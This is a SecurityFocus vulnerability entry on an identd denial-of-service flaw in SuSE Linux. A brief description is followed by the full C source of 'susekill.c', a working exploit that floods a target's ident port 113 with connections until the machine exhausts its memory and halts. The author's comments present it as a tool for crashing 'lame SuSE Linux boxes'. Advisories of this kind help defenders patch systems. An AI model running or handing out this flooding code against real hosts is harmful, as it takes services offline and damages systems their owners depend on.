source: http://www.securityfocus.com/bid/587/info

In the inetd.conf under certain distributions of SuSE Linux the in.identd daemon is started with the -w -t120 option. This means that one identd process waits 120 seconds after answering the first request to answer the next request. If a malicious remote attacker starts a large number of ident requests in a short period of time it will force the target machine to start multiple daemons because the initial daemon is in a time wait state. This can eventually lead the machine to starve itself of memory resulting essentially in a machine halt.

/* susekill.c by friedolin
 * 
 * used to kill lame SuSE Linux boxes with identd running
 * identd must be started with -w -t120 to crash a machine
 *
 * have fun, friedolin <hendrik@scholz.net>
 *
 * based on gewse.c by napster
 */

/* Tested systems:
 *
 * vulnerable:
 *
 *  SuSE-Linux 4.4 - 6.2
 *  Slackware  3.2 and 3.6
 *
 * not vulnerable:
 *
 *  RedHat 5.0 - 6.0 
 *  Debian 2.0 - 2.1
 * 
 * not tested:
 *
 *  pre 4.3 SuSE systems
 *  pre 5.0 RedHat
 *  pre 2.0 Debian
 *  other Slackware releases
 *  Caldera Open Linux, ...
 *
 * please send me your results and experiences !
 * 
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>

#define GETIDENT "1027, 6667 : USERID : UNIX : killsuse"

int sockdesc;
int portkill;
int numkill;
int x;

void usage(char *progname)
{
  printf("susekill by friedolin (based on gewse.c)\n");
  printf("usage: %s <host> <# of connections>\n",progname);
  exit(69);
}

main(int argc, char *argv[])
{
    
 struct sockaddr_in sin;
 struct hostent *he;

 if (argc<3) usage(argv[0]);
  
 sin.sin_port = htons(113);
 sin.sin_family = AF_INET;
 
 he = gethostbyname(argv[1]);
 if (he) {
   sin.sin_family = AF_INET;
   sin.sin_port = htons(113);
   memcpy((caddr_t)&sin.sin_addr.s_addr, he->h_addr, he->h_length);
 } else {
   perror("resolving");
 }

 numkill  = atoi(argv[2]);

 printf("Flooding %s [%s] identd %d times.\n", argv[1], inet_ntoa(sin.sin_addr.s_addr), numkill);
 printf("Killing");
 fflush(stdout);

 for (x=1;x<=numkill;x++) {

 sockdesc = socket(AF_INET, SOCK_STREAM, 0);

 if (sockdesc < 0) {
  perror("socket");
  exit(69);
 }
  
  if (connect(sockdesc, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
   perror("connect");
   exit(69);
  }

  printf(" .");
  fflush(stdout);
  (void) write(sockdesc, GETIDENT, strlen(GETIDENT));
 }

 printf("\n");

}
